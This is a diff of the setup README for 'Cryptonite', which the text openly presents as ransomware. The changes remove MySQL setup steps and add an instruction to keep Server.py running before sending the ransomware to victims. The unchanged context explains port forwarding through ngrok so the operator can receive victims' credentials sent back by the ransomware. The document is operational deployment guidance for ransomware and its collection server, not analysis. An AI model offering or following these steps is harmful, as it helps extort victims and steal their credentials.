@@ -45,18 +45,12 @@ The following setups need to be done if you are using Cryptonite for the first t
      
         ./ngrok authtoken YOUR_AUTH_TOKEN_HERE
 
-### Download and install MySQL in your system
-
-Watch youtube videos or find resources to install MySQL in your system. Once installed, there is no need to worry again. Make sure to remember the username and the password you have set. We will require them in the future. Run the MySQL server in the background.
-
 ### Install the Python requirements for Cryptonite
 
     pip install -r "requirements.txt"  
 
 ## 2. FIRING UP THE SERVER!
-
-Open server.py and edit the line [here](https://github.com/CYBERDEVILZ/Cryptonite/blob/21b935754f9b7026334537e93749b88b6e82abe2/server.py#L73). Replace "YOUR_USERNAME_HERE" with the username and "YOUR_PASSWORD_HERE" with the password you set up for the MySQL server.   
-
+Run the Server.py file before you send the ransomware to victims. Make sure that the Server runs all the time.
 We will be running the Server on port 8000 of our localhost. Hence we need to perform port forwarding using NGROK to receive the credentials of our victims sent by our Ransomware. That will be our next step.
 
 ## 3. PORT FORWARDING USING NGROK
